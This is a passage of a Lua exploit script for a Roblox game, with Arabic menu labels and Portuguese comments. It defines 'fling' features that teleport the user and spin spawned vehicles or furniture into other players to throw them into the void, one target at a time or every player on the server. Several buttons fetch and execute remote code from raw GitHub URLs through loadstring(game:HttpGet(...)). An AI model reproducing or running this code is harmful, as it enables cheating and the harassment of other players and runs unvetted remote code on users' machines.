                while autoFlingActive do
                    task.wait(1)
                    
                    -- Usa o alvo travado
                    if not lockedTarget or lockedTarget == "" then
                        SendNotification("Auto Fling", "Alvo perdido")
                        autoFlingActive = false
                        break
                    end
                    
                    local currentTarget = Players:FindFirstChild(lockedTarget)
                    
                    if not currentTarget then
                        SendNotification("Auto Fling", lockedTarget .. " saiu do jogo")
                        autoFlingActive = false
                        break
                    end
                    
                    -- Aguarda personagens
                    local waitTime = 0
                    while (not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) and waitTime < 10 do
                        task.wait(0.5)
                        waitTime = waitTime + 0.5
                    end
                    
                    if not LocalPlayer.Character or not currentTarget.Character then
                        continue
                    end
                    
                    if not currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                        continue
                    end
                    
                    -- Executa fling
                    pcall(function()
                        if selectedMethod == "كرة قدم" then
                            FlingBall(currentTarget)
                            task.wait(2)
                            
                        elseif selectedMethod == "كنبة" then
                            if not IsPlayerSitting(currentTarget) then
                                KillCouch(currentTarget)
                            end
                            task.wait(3)
                            
                        elseif selectedMethod == "قارب" then
                            if not IsPlayerSitting(currentTarget) then
                                KillVehicle(currentTarget, "Boat")
                            end
                            task.wait(5)
                            
                        elseif selectedMethod == "قارب شرطة" then
                            if not IsPlayerSitting(currentTarget) then
                                KillVehicle(currentTarget, "PoliceBoat")
                            end
                            task.wait(5)
                            
                        elseif selectedMethod == "باص" then
                            if not IsPlayerSitting(currentTarget) then
                                KillVehicle(currentTarget, "Bus")
                            end
                            task.wait(5)
                            
                        elseif selectedMethod == "جرارة" then
                            if not IsPlayerSitting(currentTarget) then
                                KillVehicle(currentTarget, "TowTruck")
                            end
                            task.wait(5)
                        end
                    end)
                end
            end)
        else
            SendNotification("Auto Fling", "Desativado")
        end
    end
})

flingsTab:AddSection({ "الفلنق ب نقرة" })
flingsTab:AddToggle({
Name="تطيير ابواب ب ضغطة",Description="",Default=false,
Callback=function(state)
if state then
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom77"))()
else
if Connections then for _,c in ipairs(Connections) do pcall(function() c:Disconnect() end) end end
if ControlledDoors then
for _,data in ipairs(ControlledDoors) do
if data.Part then
local p=data.Part
if p:FindFirstChild("Luscaa_Attached") then p.Luscaa_Attached:Destroy() end
for _,o in ipairs(p:GetChildren()) do
if o:IsA("AlignPosition") or o:IsA("Torque") or o:IsA("Attachment") then o:Destroy() end
end
p.CanCollide=true
end
end
end
if BlackHole then BlackHole:Destroy() end
end
end})

flingsTab:AddButton({
    Name = "تطيير كرة ب ضغطة",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom78"))()

end
})

flingsTab:AddButton({
    Name = "تطيير كنبة ب ضغطة",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom79"))()
end
})

flingsTab:AddButton({
    Name = "قتل ب ضغطة باص",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom80"))()
    end
})

flingsTab:AddButton({
    Name = "قتل ب ضغطة قارب شرطة",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom81"))()
    end
})

flingsTab:AddSection({ "تطيير بالقارب" })

flingsTab:AddButton({
    Name = "طيره بقارب",
    Callback = function()
        if not lockedTarget or lockedTarget == "" then
            SendNotification("Erro", "Selecione um alvo primeiro!")
            return
        end
        
        local target = Players:FindFirstChild(lockedTarget)
        if not target or not target.Character then
            SendNotification("Erro", "Alvo não encontrado!")
            return
        end
        
        if IsPlayerSitting(target) then
            SendNotification("Bloqueado", "Alvo está sentado!")
            return
        end
        
        SendNotification("Fling Canoe", "Iniciando fling com Spin!")
        
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        
        if not humanoidRootPart or not humanoid then return end
        
        local originalPosition = humanoidRootPart.CFrame
        
        -- Teleporta para o local
        humanoidRootPart.CFrame = CFrame.new(-229, 0, 1011)
        task.wait(0.5)
        
        -- Spawna canoa
        local canoeButton = workspace.WorkspaceCom:FindFirstChild("001_CanoeCloneButton")
        if canoeButton then
            local button = canoeButton:FindFirstChild("Button")
            if button then
                local clickDetector = button:FindFirstChild("ClickDetector")
                if clickDetector then
                    fireclickdetector(clickDetector)
                end
            end
        end
        
        task.wait(1.5)
        
        local canoeStorage = workspace.WorkspaceCom:FindFirstChild("001_CanoeStorage")
        if not canoeStorage then
            SendNotification("Erro", "CanoeStorage não encontrado")
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        local canoe = canoeStorage:FindFirstChild("Canoe")
        if not canoe then
            SendNotification("Erro", "Canoa não spawnou")
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        -- Teleporta para a canoa
        humanoidRootPart.CFrame = canoe:GetPivot() * CFrame.new(0, 3, 0)
        task.wait(0.5)
        
        -- Procura assento
        local seat = nil
        for _, child in pairs(canoe:GetDescendants()) do
            if child:IsA("Seat") or child:IsA("VehicleSeat") then
                seat = child
                break
            end
        end
        
        if not seat then
            SendNotification("Erro", "Assento não encontrado")
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        -- Senta
        local attempts = 0
        repeat
            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 1, 0)
            task.wait(0.1)
            attempts = attempts + 1
        until humanoid.Sit or attempts > 60
        
        if not humanoid.Sit then
            SendNotification("Erro", "Não conseguiu sentar")
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        SendNotification("Fling Canoe", "SPIN ATIVADO!")
        
        seat.CanTouch = false
        seat.CanCollide = false
        
        workspace.FallenPartsDestroyHeight = 0/0
        workspace.CurrentCamera.CameraSubject = humanoid
        
        -- CRIA SPIN NO ASSENTO DA CANOA
        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Parent = seat
        Spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        Spin.AngularVelocity = Vector3.new(200, 200, 200) -- Spin em todos os eixos
        
        -- SISTEMA DE FLING AGRESSIVO COM TP PARA VOID
        local flingActive = true
        local targetInVoid = false
        local voidLocation = CFrame.new(3699, 139168, 1354)
        
        task.spawn(function()
            local startTime = tick()
            local maxTime = 25
            
            while flingActive and canoe and canoe.Parent and seat do
                local targetChar = target.Character
                if not targetChar then break end
                
                local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
                
                if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then break end
                
                -- Verifica void
                if targetRoot.Position.Y < -100 then
                    targetInVoid = true
                    SendNotification("Fling Canoe", "ALVO NO VOID!")
                    break
                end
                
                -- Verifica se sentou - TELEPORTA PARA O VOID
                if targetHumanoid.Sit then
                    SendNotification("Fling Canoe", "ALVO SENTOU! LEVANDO PARA O VOID...")
                    
                    pcall(function()
                        seat.CFrame = voidLocation
                    end)
                    
                    task.wait(2)
                    targetInVoid = true
                    break
                end
                
                local Angle = (tick() - startTime) * 100
                
                -- MOVIMENTOS AGRESSIVOS
                if targetRoot.Velocity.Magnitude < 50 then
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 1.25
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, 0) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 1.25
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(2.25, 1.5, -2.25) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 1.25
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(-2.25, -1.5, 2.25) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 1.25
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) + targetHumanoid.MoveDirection
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, 0) + targetHumanoid.MoveDirection
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(Angle), 0, 0)
                    end)
                    task.wait()
                    
                else
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, targetHumanoid.WalkSpeed)
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(90), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, -targetHumanoid.WalkSpeed)
                        seat.CFrame = seat.CFrame * CFrame.Angles(0, 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, targetRoot.Velocity.Magnitude / 1.25)
                        seat.CFrame = seat.CFrame * CFrame.Angles(math.rad(90), 0, 0)
                    end)
                    task.wait()
                    
                    pcall(function()
                        seat.CFrame = CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, -targetRoot.Velocity.Magnitude / 1.25)
                        seat.CFrame = seat.CFrame * CFrame.Angles(0, 0, 0)
                    end)
                    task.wait()
                end
                
                -- Se alvo está com velocidade alta, LEVA PARA O VOID
                if targetRoot.Velocity.Magnitude > 500 then
                    SendNotification("Fling Canoe", "LEVANDO PARA O VOID!")
                    
                    for i = 1, 5 do
                        pcall(function()
                            seat.CFrame = voidLocation
                        end)
                        task.wait(0.5)
                    end
                    
                    targetInVoid = true
                    break
                end
                
                if tick() - startTime > maxTime then break end
            end
            flingActive = false
        end)
        
        while flingActive do task.wait(0.1) end
        
        if Spin then Spin:Destroy() end
        
        workspace.CurrentCamera.CameraSubject = humanoid
        
        task.wait(0.3)
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        
        task.wait(0.7)
        if humanoidRootPart then
            humanoidRootPart.CFrame = originalPosition
            humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
            humanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
        end
        
        task.wait(0.5)
        
        if canoe and canoe.Parent then
            canoe:Destroy()
        end
        
        workspace.FallenPartsDestroyHeight = -500
        
        if targetInVoid then
            SendNotification("Flingado", target.Name .. " foi enviado para o void!")
        else
            SendNotification("Fling Canoe", "Fling concluído")
        end
    end
})
flingsTab:AddSection({ "Flings All" })


flingsTab:AddButton({
    Name = "تطيير الكل - كرة",
    Callback = function()
        SendNotification("Fling All Ball", "Iniciando...")
        
        local totalPlayers = 0
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                totalPlayers = totalPlayers + 1
            end
        end
        
        if totalPlayers == 0 then
            SendNotification("Erro", "Nenhum jogador para flingar!")
            return
        end
        
        local flinged = 0
        
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                SendNotification("Fling All", "Flingando " .. player.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                
                task.spawn(function()
                    pcall(function()
                        FlingBall(player)
                    end)
                end)
                
                flinged = flinged + 1
                task.wait(2.5)
            end
        end
        
        SendNotification("Fling All Ball", "Concluído! " .. flinged .. " jogadores flingados")
    end
})


flingsTab:AddButton({
    Name = "تطيير الكل - كنبة",
    Callback = function()
        SendNotification("Fling All Couch", "Iniciando...")
        
        local totalPlayers = 0
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not IsPlayerSitting(player) then
                totalPlayers = totalPlayers + 1
            end
        end
        
        if totalPlayers == 0 then
            SendNotification("Erro", "Nenhum jogador disponível!")
            return
        end
        
        local flinged = 0
        
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and not IsPlayerSitting(player) then
                SendNotification("Fling All", "Flingando " .. player.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                
                local RootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not RootPart then break end
                
                local originalPosition = RootPart.CFrame
                workspace.FallenPartsDestroyHeight = 0/0
                
                -- Pega e equipa o sofá
                if not GetAndEquipCouch() then
                    SendNotification("Erro", "Não foi possível equipar sofá")
                    workspace.FallenPartsDestroyHeight = -500
                    task.wait(2)
                    continue
                end
                
                task.wait(0.5)
                
                -- Executa o fling
                while not player.Character do task.wait(0.1) end
                SkidFling(player, originalPosition)
                
                -- Aguarda mais tempo antes do próximo
                task.wait(4)
                
                flinged = flinged + 1
            end
        end
        
        workspace.FallenPartsDestroyHeight = -500
        SendNotification("Fling All Couch", "✅ lConcluído! " .. flinged .. " jogadores flingados")
    end
})

flingsTab:AddButton({
    Name = "تطيير الكل - قارب",
    Callback = function()
        SendNotification("Fling All Boat", "Iniciando...")
        
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        
        if not humanoidRootPart or not humanoid then return end
        
        local originalPosition = humanoidRootPart.CFrame
        local Vehicles = workspace:FindFirstChild("Vehicles")
        
        -- Spawna boat
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
        end)
        
        task.wait(2)
        
        local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
        if not vehicle then
            humanoidRootPart.CFrame = originalPosition
            SendNotification("Erro", "Boat não spawnou")
            return
        end
        
        local seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
        if not seat then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        -- Senta no barco
        local attempts = 0
        repeat
            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
            task.wait(0.1)
            attempts = attempts + 1
        until humanoid.Sit or attempts > 50
        
        if not humanoid.Sit then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        -- CORRIGE A CÂMERA - Mantém no player
        workspace.CurrentCamera.CameraSubject = humanoid
        
        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Parent = vehicle.PrimaryPart
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, 200, 0)
        
        local totalPlayers = 0
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and not IsPlayerSitting(p) then
                totalPlayers = totalPlayers + 1
            end
        end
        
        local flinged = 0
        
        -- Flinga cada jogador individualmente
        for _, target in pairs(Players:GetPlayers()) do
            if target ~= LocalPlayer and target.Character then
                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
                
                if targetRoot and targetHumanoid and not IsPlayerSitting(target) then
                    SendNotification("Fling All", "Flingando " .. target.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                    
                    -- MANTÉM CÂMERA NO SEU PLAYER
                    workspace.CurrentCamera.CameraSubject = humanoid
                    
                    local startTime = tick()
                    local flingTime = 10
                    
                    while tick() - startTime < flingTime do
                        if not targetRoot or not vehicle or not vehicle.Parent then break end
                        if targetHumanoid.Health <= 0 or targetRoot.Position.Y < -100 then break end
                        
                        -- Movimento mais SUAVE
                        local angle = (tick() - startTime) * 30
                        
                        if targetRoot.Velocity.Magnitude < 50 then
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(angle), 0, 0))
                            end)
                            task.wait(0.15)
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(angle), 0, 0))
                            end)
                            task.wait(0.15)
                        else
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0))
                            end)
                            task.wait(0.15)
                        end
                        
                        if targetRoot.Velocity.Magnitude > 150 then
                            SendNotification("Fling", target.Name .. " foi flingado!")
                            break
                        end
                    end
                    
                    flinged = flinged + 1
                    task.wait(1.5)
                end
            end
        end
        
        if Spin then Spin:Destroy() end
        
        -- Restaura câmera
        workspace.CurrentCamera.CameraSubject = humanoid
        
        task.wait(0.5)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.7)
        humanoidRootPart.CFrame = originalPosition
        task.wait(0.5)
        DeleteAllVehicles()
        workspace.FallenPartsDestroyHeight = -500
        
        SendNotification("Fling All Boat", "Concluído! " .. flinged .. " jogadores flingados")
    end
})

flingsTab:AddButton({
    Name = "تطيير الكل - قارب شرطة",
    Callback = function()
        SendNotification("Fling All PoliceBoat", "Iniciando...")
        
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        
        if not humanoidRootPart or not humanoid then return end
        
        local originalPosition = humanoidRootPart.CFrame
        local Vehicles = workspace:FindFirstChild("Vehicles")
        
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "PoliceBoatChangeable")
        end)
        
        task.wait(2)
        
        local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
        if not vehicle then
            humanoidRootPart.CFrame = originalPosition
            SendNotification("Erro", "PoliceBoat não spawnou")
            return
        end
        
        local seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
        if not seat then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        local attempts = 0
        repeat
            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
            task.wait(0.1)
            attempts = attempts + 1
        until humanoid.Sit or attempts > 50
        
        if not humanoid.Sit then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        -- CORRIGE A CÂMERA
        workspace.CurrentCamera.CameraSubject = humanoid
        
        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Parent = vehicle.PrimaryPart
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, 200, 0)
        
        local totalPlayers = 0
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and not IsPlayerSitting(p) then
                totalPlayers = totalPlayers + 1
            end
        end
        
        local flinged = 0
        
        for _, target in pairs(Players:GetPlayers()) do
            if target ~= LocalPlayer and target.Character then
                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
                
                if targetRoot and targetHumanoid and not IsPlayerSitting(target) then
                    SendNotification("Fling All", "Flingando " .. target.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                    
                    workspace.CurrentCamera.CameraSubject = humanoid
                    
                    local startTime = tick()
                    local flingTime = 10
                    
                    while tick() - startTime < flingTime do
                        if not targetRoot or not vehicle or not vehicle.Parent then break end
                        if targetHumanoid.Health <= 0 or targetRoot.Position.Y < -100 then break end
                        
                        local angle = (tick() - startTime) * 30
                        
                        if targetRoot.Velocity.Magnitude < 50 then
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(angle), 0, 0))
                            end)
                            task.wait(0.15)
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(angle), 0, 0))
                            end)
                            task.wait(0.15)
                        else
                            pcall(function()
                                vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0))
                            end)
                            task.wait(0.15)
                        end
                        
                        if targetRoot.Velocity.Magnitude > 150 then
                            SendNotification("Fling", target.Name .. " foi flingado!")
                            break
                        end
                    end
                    
                    flinged = flinged + 1
                    task.wait(1.5)
                end
            end
        end
        
        if Spin then Spin:Destroy() end
        workspace.CurrentCamera.CameraSubject = humanoid
        
        task.wait(0.5)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.7)
        humanoidRootPart.CFrame = originalPosition
        task.wait(0.5)
        DeleteAllVehicles()
        workspace.FallenPartsDestroyHeight = -500
        
        SendNotification("Fling All PoliceBoat", "Concluído! " .. flinged .. " jogadores flingados")
    end
})

flingsTab:AddButton({
    Name = "تطيير الكل - باص",
    Callback = function()
        SendNotification("Fling All Bus", "Iniciando...")
        
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        
        if not humanoidRootPart or not humanoid then return end
        
        local originalPosition = humanoidRootPart.CFrame
        local Vehicles = workspace:FindFirstChild("Vehicles")
        
        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)
        pcall(function()
            local args = {"PickingCar", "SchoolBus"}
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        end)
        
        task.wait(2)
        
        local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
        if not vehicle then
            humanoidRootPart.CFrame = originalPosition
            SendNotification("Erro", "Bus não spawnou")
            return
        end
        
        local seat = vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat")
        if not seat then
            seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
        end
        
        if not seat then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        local attempts = 0
        repeat
            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
            task.wait(0.1)
            attempts = attempts + 1
        until humanoid.Sit or attempts > 50
        
        if not humanoid.Sit then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        workspace.CurrentCamera.CameraSubject = humanoid
        
        local totalPlayers = 0
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and not IsPlayerSitting(p) then
                totalPlayers = totalPlayers + 1
            end
        end
        
        local flinged = 0
        
        for _, target in pairs(Players:GetPlayers()) do
            if target ~= LocalPlayer and target.Character then
                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
                
                if targetRoot and targetHumanoid and not IsPlayerSitting(target) then
                    SendNotification("Fling All", "Flingando " .. target.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                    
                    local startTime = tick()
                    
                    while tick() - startTime < 12 do
                        if not targetRoot or not vehicle or not vehicle.Parent then break end
                        if targetHumanoid.Health <= 0 or targetRoot.Position.Y < -100 then break end
                        
                        local time = tick() * 30
                        local lateralOffset = math.sin(time) * 5
                        local frontBackOffset = math.cos(time) * 18
                        
                        pcall(function()
                            vehicle:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                        end)
                        
                        if targetRoot.Velocity.Magnitude > 150 then
                            SendNotification("Fling", target.Name .. " foi flingado!")
                            break
                        end
                        
                        task.wait(0.1)
                    end
                    
                    flinged = flinged + 1
                    task.wait(1.5)
                end
            end
        end
        
        workspace.CurrentCamera.CameraSubject = humanoid
        
        task.wait(0.5)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.7)
        humanoidRootPart.CFrame = originalPosition
        task.wait(0.5)
        DeleteAllVehicles()
        workspace.FallenPartsDestroyHeight = -500
        
        SendNotification("Fling All Bus", "Concluído! " .. flinged .. " jogadores flingados")
    end
})

flingsTab:AddButton({
    Name = "تطيير الكل - جرارة",
    Callback = function()
        SendNotification("Fling All TowTruck", "Iniciando...")
        
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        
        if not humanoidRootPart or not humanoid then return end
        
        local originalPosition = humanoidRootPart.CFrame
        local Vehicles = workspace:FindFirstChild("Vehicles")
        
        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)
        pcall(function()
            local args = {"PickingCar", "TowTruck"}
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        end)
        
        task.wait(2)
        
        local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
        if not vehicle then
            humanoidRootPart.CFrame = originalPosition
            SendNotification("Erro", "TowTruck não spawnou")
            return
        end
        
        local seat = vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat")
        if not seat then
            seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
        end
        
        if not seat then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        local attempts = 0
        repeat
            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
            task.wait(0.1)
            attempts = attempts + 1
        until humanoid.Sit or attempts > 50
        
        if not humanoid.Sit then
            DeleteAllVehicles()
            humanoidRootPart.CFrame = originalPosition
            return
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        workspace.CurrentCamera.CameraSubject = humanoid
        
        local totalPlayers = 0
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and not IsPlayerSitting(p) then
                totalPlayers = totalPlayers + 1
            end
        end
        
        local flinged = 0
        
        for _, target in pairs(Players:GetPlayers()) do
            if target ~= LocalPlayer and target.Character then
                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
                
                if targetRoot and targetHumanoid and not IsPlayerSitting(target) then
                    SendNotification("Fling All", "Flingando " .. target.Name .. " (" .. (flinged + 1) .. "/" .. totalPlayers .. ")")
                    
                    local startTime = tick()
                    
                    while tick() - startTime < 12 do
                        if not targetRoot or not vehicle or not vehicle.Parent then break end
                        if targetHumanoid.Health <= 0 or targetRoot.Position.Y < -100 then break end
                        
                        local time = tick() * 30
                        local lateralOffset = math.sin(time) * 5
                        local frontBackOffset = math.cos(time) * 18
                        
                        pcall(function()
                            vehicle:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                        end)
                        
                        if targetRoot.Velocity.Magnitude > 150 then
                            SendNotification("Fling", target.Name .. " foi flingado!")
                            break
                        end
                        
                        task.wait(0.1)
                    end
                    
                    flinged = flinged + 1
                    task.wait(1.5)
                end
            end
        end
        
        workspace.CurrentCamera.CameraSubject = humanoid
        
        task.wait(0.5)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.7)
        humanoidRootPart.CFrame = originalPosition
        task.wait(0.5)
        DeleteAllVehicles()
        workspace.FallenPartsDestroyHeight = -500
        
        SendNotification("Fling All TowTruck", "Concluído! " .. flinged .. " jogadores flingados")
    end
})


flingsTab:AddSection({ "تخريب السيارة عن بعد" })
flingsTab:AddSection({ "سيارة تخرب على الهدف لحالها" })
flingsTab:AddSection({ "ميزة جديدة وقوية وذكية" })

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RemoteFolder = ReplicatedStorage:WaitForChild("RE")

local vehiclesFolder = workspace:WaitForChild("Vehicles")
local isActiveVehicle = false
local selectedPlayerName = nil

local function grudar(part, weldRef)
	if not weldRef and part then
		hrp.CFrame = part.CFrame + Vector3.new(0, 2, 0)
		local weld = Instance.new("WeldConstraint")
		weld.Part0 = hrp
		weld.Part1 = part
		weld.Parent = hrp
		return weld
	end
end

local function desgrudar(weldRef)
	if weldRef then
		weldRef:Destroy()
		weldRef = nil
	end
	return nil
end

local function getMyVehicleSeat()
	for _, vehicle in pairs(vehiclesFolder:GetChildren()) do
		if string.find(vehicle.Name, LocalPlayer.Name) then
			return vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
		end
	end
	return nil
end

task.spawn(function()
	while true do
		if isActiveVehicle and selectedPlayerName then
